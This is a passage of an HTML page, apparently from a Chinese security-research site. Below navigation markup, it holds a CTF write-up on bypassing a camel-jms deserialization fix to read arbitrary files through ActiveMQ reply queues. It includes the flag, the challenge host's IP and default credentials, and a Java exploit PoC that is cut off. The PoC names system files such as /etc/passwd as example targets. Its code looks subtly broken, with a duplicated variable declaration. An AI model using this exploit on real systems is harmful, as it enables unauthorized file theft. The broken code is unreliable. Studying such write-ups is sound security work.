+          <i class="fas fa-cubes"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/15_k8s_networkpolicy/01_discovery/" title="集群网络通信梳理与分析">
+          <i class="fas fa-cubes"></i>
+          <span class="doc-nav-label">通信梳理</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/15_k8s_networkpolicy/02_design/" title="NetworkPolicy策略设计与部署">
+          <i class="fas fa-cubes"></i>
+          <span class="doc-nav-label">策略设计</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/15_k8s_networkpolicy/03_validate/" title="验证测试与持续维护">
+          <i class="fas fa-cubes"></i>
+          <span class="doc-nav-label">验证维护</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/15_k8s_networkpolicy/04_playbook/" title="策略模板与应急处置手册">
+          <i class="fas fa-cubes"></i>
+          <span class="doc-nav-label">策略模板</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="16_ad_hardening">
+    <button class="doc-nav-group-toggle" data-target="doc-group-16_ad_hardening">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>AD HARDENING</span>
+      <em class="doc-nav-count">5</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-16_ad_hardening">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/16_ad_hardening/00_overview/" title="Windows AD域环境安全加固技战法">
+          <i class="fas fa-network-wired"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/16_ad_hardening/01_assessment/" title="域环境安全评估">
+          <i class="fas fa-network-wired"></i>
+          <span class="doc-nav-label">安全评估</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/16_ad_hardening/02_gpo_hardening/" title="组策略安全加固实施">
+          <i class="fas fa-network-wired"></i>
+          <span class="doc-nav-label">组策略加固</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/16_ad_hardening/03_attack_surface/" title="攻击面验证与持续优化">
+          <i class="fas fa-network-wired"></i>
+          <span class="doc-nav-label">攻击验证</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/16_ad_hardening/04_attack_playbook/" title="攻击手法应急与回退手册">
+          <i class="fas fa-network-wired"></i>
+          <span class="doc-nav-label">应急手册</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="17_container_security">
+    <button class="doc-nav-group-toggle" data-target="doc-group-17_container_security">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>CONTAINER SECURITY</span>
+      <em class="doc-nav-count">6</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-17_container_security">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/17_container_security/00_overview/" title="容器安全全生命周期技战法">
+          <i class="fas fa-box"></i>
+          <span class="doc-nav-label">概述</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/17_container_security/01_assessment/" title="容器环境安全评估">
+          <i class="fas fa-magnifying-glass-chart"></i>
+          <span class="doc-nav-label">环境评估</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/17_container_security/02_predeploy_defense/" title="部署前安全防线">
+          <i class="fas fa-shield-halved"></i>
+          <span class="doc-nav-label">部署前防线</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/17_container_security/03_runtime_monitoring/" title="运行时四维行为监控">
+          <i class="fas fa-eye"></i>
+          <span class="doc-nav-label">运行时监控</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/17_container_security/04_incident_response/" title="应急响应处置管线">
+          <i class="fas fa-bolt"></i>
+          <span class="doc-nav-label">应急响应</span>
+        </a>
+      </li>
+      
+      <li class="doc-nav-item ">
+        <a href="/document/17_container_security/05_lifecycle_defense/" title="容器安全全生命周期防线">
+          <i class="fas fa-layer-group"></i>
+          <span class="doc-nav-label">全生命周期防线</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+
+  <div class="doc-nav-group" data-dir="18_miniapp_android_pacakge">
+    <button class="doc-nav-group-toggle" data-target="doc-group-18_miniapp_android_pacakge">
+      <i class="fas fa-folder doc-nav-group-icon"></i>
+      <span>MINIAPP ANDROID PACAKGE</span>
+      <em class="doc-nav-count">1</em>
+      <i class="fas fa-chevron-down doc-nav-arrow"></i>
+    </button>
+
+    <ul class="doc-nav-list" id="doc-group-18_miniapp_android_pacakge">
+      
+      
+      
+      
+      <li class="doc-nav-item ">
+        <a href="/document/18_miniapp_android_pacakge/00_tech_overview/" title="微信小程序隐私合规检测技术方法总结">
+          <i class="fas fa-clipboard-check"></i>
+          <span class="doc-nav-label">方法总结</span>
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  
+</nav>
+<script>
+  (function () {
+    'use strict';
+    function initDocSidebarHandle() {
+      var sidebar = document.querySelector('.doc-sidebar');
+      if (!sidebar) return;
+  
+      var wrapper = document.querySelector('.doc-wrapper');
+      if (!wrapper) return;
+  
+      if (sidebar.querySelector('.doc-nav-handle')) return;
+  
+      // 动态插入把手
+      var handle = document.createElement('div');
+      handle.className = 'doc-nav-handle';
+      handle.id = 'doc-nav-handle';
+      handle.title = '点击折叠 / 展开侧边栏';
+      handle.innerHTML =
+        '<span class="doc-nav-handle-bar"></span>' +
+        '<i class="fas fa-chevron-left doc-nav-handle-icon"></i>';
+      sidebar.appendChild(handle);
+  
+      var originalWidth = sidebar.getBoundingClientRect().width;
+      var collapsed = false;
+  
+      // 鼠标靠近右边缘时高亮 border
+      sidebar.addEventListener('mousemove', function (e) {
+        var rect = sidebar.getBoundingClientRect();
+        var distToRight = rect.right - e.clientX;
+        if (distToRight <= 10) {
+          sidebar.classList.add('is-handle-hot');
+          handle.classList.add('is-hot');
+        } else {
+          sidebar.classList.remove('is-handle-hot');
+          handle.classList.remove('is-hot');
+        }
+      });
+  
+      sidebar.addEventListener('mouseleave', function () {
+        sidebar.classList.remove('is-handle-hot');
+        handle.classList.remove('is-hot');
+      });
+  
+      // 点击把手折叠/展开
+      handle.addEventListener('click', function (e) {
+        e.stopPropagation();
+        if (!collapsed) {
+          sidebar.style.width = originalWidth + 'px';
+          void sidebar.offsetWidth;
+          sidebar.classList.add('is-collapsed');
+          sidebar.style.width = '0px';
+          wrapper.classList.add('is-sidebar-collapsed');
+          collapsed = true;
+        } else {
+          sidebar.classList.remove('is-collapsed');
+          sidebar.style.width = originalWidth + 'px';
+          wrapper.classList.remove('is-sidebar-collapsed');
+          collapsed = false;
+          setTimeout(function () {
+            sidebar.style.width = '';
+          }, 320);
+        }
+        window.dispatchEvent(new CustomEvent('docnav:toggle', {
+          detail: { collapsed: collapsed }
+        }));
+      });
+  
+      // 快捷键 [ 切换
+      document.addEventListener('keydown', function (e) {
+        if (e.key === '[' && !/input|textarea/i.test(e.target.tagName)) {
+          handle.click();
+        }
+      });
+    }
+  
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initDocSidebarHandle);
+    } else {
+      initDocSidebarHandle();
+    }
+  })();
+  function collapseDocSidebar() {
+        var sidebarHandle = document.getElementById('doc-nav-handle');
+        var sidebar = document.querySelector('.doc-sidebar');
+        var wrapper = document.querySelector('.doc-wrapper');
+
+        if (!sidebarHandle || !sidebar || !wrapper) return;
+        if (sidebar.classList.contains('is-collapsed')) return;
+
+        sidebarHandle.click();
+    }
+  window.collapseDocSidebar = collapseDocSidebar;
+  </script>
+
+      <div class="doc-sidebar-footer">
+        <a href="/">
+          <i class="fas fa-arrow-left"></i>
+          返回首页
+        </a>
+      </div>
+    </aside>
+
+    <!-- Content -->
+    <main class="doc-content-wrap">
+      <!-- Breadcrumb -->
+      <div class="doc-breadcrumb">
+        <a class="is-active">Docs</a>
+        
+        
+          
+        
+          
+            
+            <span class="doc-breadcrumb-sep">/</span>
+            <span>ctf</span>
+          
+        
+          
+        <span class="doc-breadcrumb-sep">|</span>
+        <div role="navigation">
+    <nav class="sentinel-nav">
+        <div class="sentinel-nav-inner">
+          
+          
+          <!-- Mobile toggle -->
+          <button class="sentinel-nav-toggle" id="sentinel-nav-toggle" aria-label="Toggle navigation">
+            <i class="fas fa-bars"></i>
+          </button>
+
+          <!-- Nav items -->
+          <div class="sentinel-nav-list-wrap" id="sentinel-nav-list-wrap">
+            <ul class="sentinel-nav-list">
+
+              
+
+                <li class="sentinel-nav-item ">
+                  <a href="/">
+                    <i class="fas fa-home"></i> Home
+                  </a>
+                </li>
+                <li class="sentinel-nav-item ">
+                  <a href="/blog/">
+                    <i class="fas fa-pen-nib"></i> Blog
+                  </a>
+                </li>
+                
+                
+                <span class="sentinel-nav-sep"></span>
+
+                <li class="sentinel-nav-item ">
+                  <a href="/categories/">
+                    <i class="fas fa-layer-group"></i> Categories
+                  </a>
+                </li>
+                <li class="sentinel-nav-item ">
+                  <a href="/daily/">
+                    <i class="fas fa-calendar"></i> Daily
+                  </a>
+                </li>
+                <li class="sentinel-nav-item ">
+                  <a href="/newest">
+                    <i class="fas fa-bolt"></i> Newest
+                  </a>
+                </li>
+
+                <span class="sentinel-nav-sep"></span>
+
+                <li class="sentinel-nav-item ">
+                  <a href="/about/">
+                    <i class="fas fa-flask"></i> Research
+                  </a>
+                </li>
+                <li class="sentinel-nav-item">
+                  <a href="/feed.xml">
+                    <i class="fas fa-rss"></i> RSS
+                  </a>
+                </li>
+
+              
+
+            </ul>
+          </div>
+
+          <!-- Right side -->
+          <div class="sentinel-nav-right">
+            <a href="/search" title="搜索"><i class="fas fa-search"></i></a>
+            <a href="/changelog/" title="更新日志"><i class="fas fa-book"></i></a>
+          </div>
+
+        </div>
+    </nav>
+</div>
+<script>
+    (function(){
+      var toggle = document.getElementById('sentinel-nav-toggle');
+      var wrap   = document.getElementById('sentinel-nav-list-wrap');
+      if(toggle && wrap){
+        toggle.addEventListener('click', function(){
+          wrap.classList.toggle('is-open');
+          var icon = this.querySelector('i');
+          icon.classList.toggle('fa-bars-progress');
+          icon.classList.toggle('fa-xmark-circle');
+        });
+      }
+    })();
+</script>
+      </div>
+      
+      <!-- Article Header -->
+      <header class="doc-article-head">
+        <h1 class="doc-article-title">de5er1umWriteUp — ActiveMQ/Camel JMS</h1>
+        <div class="doc-article-meta">
+          
+          <span class="doc-article-meta-item">
+            <i class="fas fa-calendar-alt"></i>
+            2026/09/14
+          </span>
+          
+          
+          <span class="doc-article-meta-item">
+            
+            
+            <img src="https://avatars.githubusercontent.com/u/94035930?s=24&v=4"
+                alt="sentinel, Lab"
+                class="doc-author-avatar" />
+            
+            
+              sentinel, Lab
+            
+          </span>
+          
+          
+          <span class="doc-article-meta-item">
+            <i class="fas fa-code-branch"></i>
+            v1.0
+          </span>
+          
+          
+          
+
+          
+            
+            
+            
+              <em class="doc-nav-badge doc-nav-badge--hot" title="HOT">
+                <i class="fas fa-fire"></i> HOT
+              </em>
+            
+          
+        </div>
+        
+        <div class="doc-tags">
+          
+            <span class="doc-tag">CTF</span>
+          
+            <span class="doc-tag">ActiveMQ</span>
+          
+            <span class="doc-tag">Camel</span>
+          
+            <span class="doc-tag">JMS</span>
+          
+            <span class="doc-tag">反序列化</span>
+          
+            <span class="doc-tag">文件读取</span>
+          
+            <span class="doc-tag">白名单绕过</span>
+          
+            <span class="doc-tag">CVE-2026-40860</span>
+          
+            <span class="doc-tag">CVE-2026-42527</span>
+          
+        </div>
+        
+      </header>
+
+      <!-- Content + TOC side by side -->
+      <div class="doc-content-inner">
+
+        <!-- Article Body -->
+        <article class="doc-main doc-article-body">
+          
+<section class="gh-banner info" aria-labelledby="banner-title-a-href-document-00-ctf-02-de5er1um-jar-analysis-de5er1um-jar-逆向分析报告-a-i-class-fa-fa-star-i-de5er1um-wp文章-a-href-document-00-ctf-02-de5er1um-jar-analysis-i-class-fa-fa-link-i-de5er1um-jar-下载链接-a" role="region" data-dismissible="true">
+    <div class="banner-icon" aria-hidden="true">
+        
+        <svg viewBox="0 0 16 16" fill="currentColor">
+            <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path>
+        </svg>
+        
+    </div>
+
+    <div class="banner-content">
+        <span class="banner-text"><a href="/document/00_ctf/02_de5er1um_jar_analysis/">de5er1um.jar 逆向分析报告</a>| <i class="fa fa-star"></i> de5er1um wp文章| <a href="/document/00_ctf/02_de5er1um_jar_analysis/"><i class="fa fa-link"></i> de5er1um.jar 下载链接</a></span>
+    </div>
+</section>
+
+<p><strong>难度</strong>：中等偏难（需理解 Camel JMS 反序列化修复的绕过思路 + JMS 请求-应答机制 + Camel 类型转换器的文件读取行为）</p>
+
+<p><strong>Flag</strong>：<code class="language-plaintext highlighter-rouge">flag{FtkGd6CuYmD5nH7MUcswPeAf2NEz1qjO}</code>（位于网关容器 <code class="language-plaintext highlighter-rouge">/flag</code>）</p>
+
+<hr />
+
+<h2 id="1-题目环境">1. 题目环境</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──────────────────────────┐        ┌────────────────────────────────┐
+│  Broker (ActiveMQ 6.1.8) │        │  Gateway  (Spring Boot 3.5.13) │
+│  HTTP transport :28364   │◄──────►│  Camel 4.18.2 + activemq6      │
+│  XStream transport       │        │  consume gateway.inbound       │
+│  ctf/ctf                 │        │  JmsConfig: trustAllPackages   │
+└──────────────────────────┘        └────────────────────────────────┘
+</code></pre></div></div>
+
+<ul>
+  <li>对外端口 <code class="language-plaintext highlighter-rouge">http://47.116.47.26:28364</code> 是 <strong>ActiveMQ 的 HTTP transport</strong>（HttpTunnelServlet，走 XStream 二进制 XML 协议封装 OpenWire 命令），无认证，默认凭据 <code class="language-plaintext highlighter-rouge">ctf/ctf</code></li>
+  <li>网关 <code class="language-plaintext highlighter-rouge">de5er1um.jar</code>（附件）：Spring Boot 3.5.13 + Camel 4.18.2 + activemq-client 6.1.8，<code class="language-plaintext highlighter-rouge">JmsConfig</code> 硬编码 <code class="language-plaintext highlighter-rouge">setTrustAllPackages(true)</code>，路由 <code class="language-plaintext highlighter-rouge">CtfRoute</code> 消费 <code class="language-plaintext highlighter-rouge">activemq6:queue:gateway.inbound</code>，仅做日志（<code class="language-plaintext highlighter-rouge">payload type = {}</code>）</li>
+  <li>题目暗示：<strong>「消息中间件依赖升级到官方修复版本，真的没问题吗？」</strong> → 指向 camel-jms 4.18.2（CVE-2026-40860 的修复版本）存在修复不完整/被绕过的问题</li>
+</ul>
+
+<h2 id="2-漏洞原理">2. 漏洞原理</h2>
+
+<h3 id="21-cve-2026-40860camel-jms-objectmessage-反序列化-rce">2.1 CVE-2026-40860：camel-jms ObjectMessage 反序列化 RCE</h3>
+
+<p><code class="language-plaintext highlighter-rouge">JmsBinding.extractBodyFromJms()</code> 在 <code class="language-plaintext highlighter-rouge">mapJmsMessage=true</code>（默认）时对 incoming ObjectMessage <strong>无条件调用 <code class="language-plaintext highlighter-rouge">getObject()</code> 反序列化</strong>。4.18.2 的修复是在<strong>反序列化之后</strong>做类白名单检查：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//@hl 3-4</span>
+<span class="c1">// JmsBinding.extractBodyFromJms — 4.18.2 修复后</span>
+<span class="k">if</span> <span class="o">(</span><span class="n">message</span> <span class="k">instanceof</span> <span class="nc">ObjectMessage</span> <span class="n">objectMessage</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">Object</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">objectMessage</span><span class="o">.</span><span class="na">getObject</span><span class="o">();</span>   <span class="c1">// ← 反序列化已发生</span>
+    <span class="n">checkDeserializedClass</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>              <span class="c1">// ← 后置检查，阻止不了 readObject 副作用</span>
+    <span class="o">...</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>官方自己承认：<strong>后置类检查无法阻止反序列化过程中的 readObject 链</strong>。</p>
+
+<h3 id="22-cve-2026-42527默认-objectinputfilter-允许-javaneturldns-侧信道">2.2 CVE-2026-42527：默认 ObjectInputFilter 允许 java.net.URL（DNS 侧信道）</h3>
+
+<p>该默认过滤器模式 <code class="language-plaintext highlighter-rouge">java.**;javax.**;org.apache.camel.**;!*</code> 中的递归通配 <code class="language-plaintext highlighter-rouge">java.**</code> 放行了 <code class="language-plaintext highlighter-rouge">java.net.URL</code>——其 <code class="language-plaintext highlighter-rouge">hashCode()</code> 会做 DNS 解析。投递 <code class="language-plaintext highlighter-rouge">HashMap&lt;URL, ...&gt;</code> 反序列化时 <code class="language-plaintext highlighter-rouge">URL.hashCode</code> 触发对攻击者可控域名的 DNS 查询（OOB 侧信道）。远程验证：投递后靶机（阿里云 47.116.x/8.132.x 出口）确实查询了 interactsh 域名，确认反序列化通道 + 白名单边界（<code class="language-plaintext highlighter-rouge">java.net</code> 放行、<code class="language-plaintext highlighter-rouge">com.fasterxml</code>/<code class="language-plaintext highlighter-rouge">org.springframework</code> 拦截、<code class="language-plaintext highlighter-rouge">org.apache.camel</code> 放行）。</p>
+
+<h3 id="23-jmsreplyto-请求-应答机制">2.3 JMSReplyTo 请求-应答机制</h3>
+
+<p>投递的消息若带 <code class="language-plaintext highlighter-rouge">JMSReplyTo</code> 属性，Camel 消费端会把 Exchange 处理结果<strong>回复到该队列</strong>（reply body 默认 = 处理后的 message body）。</p>
+
+<h3 id="24-camel-typeconverterurl--string-会读取-url-内容任意文件读取关键">2.4 Camel TypeConverter：URL → String 会读取 URL 内容（任意文件读取关键）</h3>
+
+<p>回复时 <code class="language-plaintext highlighter-rouge">JmsBinding.createJmsMessageForType</code> 检测到 body 是 <code class="language-plaintext highlighter-rouge">Map</code> → 生成 <code class="language-plaintext highlighter-rouge">MapMessage</code>，<code class="language-plaintext highlighter-rouge">populateMapMessage</code> 对 Map 的每个 key 做类型转换：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// JmsBinding.populateMapMessage</span>
+<span class="k">for</span> <span class="o">(</span><span class="nc">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">map</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
+    <span class="nc">String</span> <span class="n">key</span> <span class="o">=</span> <span class="nc">CamelContextHelper</span><span class="o">.</span><span class="na">convertTo</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">());</span>
+    <span class="n">mapMessage</span><span class="o">.</span><span class="na">setObject</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Camel 的 TypeConverter 把 <code class="language-plaintext highlighter-rouge">URL</code> 转 <code class="language-plaintext highlighter-rouge">String</code> 时走 <code class="language-plaintext highlighter-rouge">URL → InputStream → String</code> 转换链，<strong>实际是 <code class="language-plaintext highlighter-rouge">URL.getContent()/openStream()</code> 读取 URL 指向的内容</strong>。因此：</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">file:///flag</code> → 读取网关容器上的 flag 文件内容</li>
+  <li>文件内容成为回复 MapMessage 的 <strong>key</strong>（value 是原 value）</li>
+</ul>
+
+<p><strong>整个利用不需要任何反序列化 gadget，无 RCE，纯白名单类（HashMap/URL）+ 回复机制 + 类型转换器完成任意文件读取。</strong></p>
+
+<h2 id="3-完整-poc">3. 完整 PoC</h2>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// @add 34-38 @del 40</span>
+<span class="kn">import</span> <span class="nn">org.apache.activemq.ActiveMQConnectionFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.activemq.command.ActiveMQObjectMessage</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.activemq.util.ByteSequence</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">jakarta.jms.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Enumeration</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+
+<span class="cm">/**
+ * de5er1um exploit PoC
+ *
+ * 原理：
+ * 1. CVE-2026-40860/42527：camel-jms 4.18.2 对 ObjectMessage 无条件反序列化，
+ *    默认 ObjectInputFilter（java.**;javax.**;org.apache.camel.**;!*）允许 java.net.URL
+ * 2. 投递顶层 HashMap&lt;URL(file:///path), "x"&gt; 作为 ObjectMessage，并设置 JMSReplyTo
+ * 3. 网关消费后（route 仅日志），因带 JMSReplyTo 触发回复
+ * 4. 回复时 JmsBinding.populateMapMessage 对 Map key 做 String 类型转换，
+ *    Camel TypeConverter 把 URL 经 URL-&gt;InputStream-&gt;String 链读取 URL 内容
+ *    （file:// URL 即任意文件读取），flag 出现在回复 MapMessage 的 key 中
+ *
+ * 用法：java -cp ... ExploitDe5er1um &lt;broker-url&gt; &lt;file-path&gt;
+ * 例：  java -cp ... ExploitDe5er1um http://47.116.47.26:28364 /flag
+ */</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ExploitDe5er1um</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">brokerUrl</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">:</span> <span class="s">"http://47.116.47.26:28364"</span><span class="o">;</span>
+        <span class="nc">String</span> <span class="n">filePath</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">?</span> <span class="n">args</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">:</span> <span class="s">"/flag"</span><span class="o">;</span>
+        <span class="c1">// =====</span>
+        <span class="c1">// 1. 构造 payload：HashMap&lt;URL(file:///path), "x"&gt;</span>
+        <span class="nc">String</span> <span class="n">normalized</span> <span class="o">=</span> <span class="n">filePath</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"\\"</span><span class="o">,</span> <span class="s">"/"</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(!</span><span class="n">normalized</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/"</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">normalized</span> <span class="o">=</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">normalized</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="no">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="s">"file://"</span> <span class="o">+</span> <span class="n">normalized</span><span class="o">);</span> 
+        <span class="c1">// exp command path arg: "C:\\Windows\\win.ini" / "/etc/passwd"</span>
+        <span class="no">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URL</span><span class="o">(</span><span class="s">"file://"</span> <span class="o">+</span> <span class="n">filePath</span><span class="o">);</span>
+
+        <span class="c1">// =====</span>
+        <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="s">"x"</span><span class="o">);</span>
+        <span class="nc">ByteArrayOutputStream</span> <span class="n">bos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="k">try</span> <span class="o">(</span><span class="nc">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="n">bos</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">bos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[*] payload: "</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="s">" bytes, url = "</span> <span class="o">+</span> <span class="n">url</span><span class="o">);</span>
+
+        <span class="c1">// 2. 连接 broker（HTTP transport）</span>
+        <span class="nc">ActiveMQConnectionFactory</span> <span class="n">cf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveMQConnectionFactory</span><span class="o">(</span><span class="n">brokerUrl</span><span class="o">);</span>
+        <span class="n">cf</span><span class="o">.</span><span class="na">setUserName</span><span class="o">(</span><span class="s">"ctf"</span><span class="o">);</span>
+        <span class="n">cf</span><span class="o">.</span><span class="na">setPassword</span><span class="o">(</span><span class="s">"ctf"</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">(</span><span class="nc">Connection</span> <span class="n">c</span> <span class="o">=</span> <span class="n">cf</span><span class="o">.</span><span class="na">createConnection</span><span class="o">())</span> <span class="o">{</span>
+            <span class="n">c</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+            <span class="nc">Session</span> <span class="n">s</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">createSession</span><span class="o">(</span><span class="kc">false</span><span class="o">,</span> <span class="nc">Session</span><span class="o">.</span><span class="na">AUTO_ACKNOWLEDGE</span><span class="o">);</span>
+
+            <span class="c1">// 回复队列（唯一命名避免冲突）</span>
+            <span class="n">jakarta</span><span class="o">.</span><span class="na">jms</span><span class="o">.</span><span class="na">Queue</span> <span class="n">replyQ</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">createQueue</span><span class="o">(</span><span class="s">"flag.exfil."</span> <span class="o">+</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">%</span> <span class="mi">1000000</span><span class="o">);</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[*] reply queue: "</span> <span class="o">+</span> <span class="n">replyQ</span><span class="o">);</span>
+
+            <span class="c1">// 3. 投递 ObjectMessage：content 反射直塞字节（绕过 setObject 信任检查）+ JMSReplyTo</span>
+            <span class="nc">ActiveMQObjectMessage</span> <span class="n">om</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ActiveMQObjectMessage</span><span class="o">)</span> <span class="n">s</span><span class="o">.</span><span class="na">createObjectMessage</span><span class="o">();</span>
+            <span class="nc">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">cc</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">activemq</span><span class="o">.</span><span class="na">command</span><span class="o">.</span><span class="na">ActiveMQMessage</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">cc</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">f</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">try</span> <span class="o">{</span> <span class="n">f</span> <span class="o">=</span> <span class="n">cc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"content"</span><span class="o">);</span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>
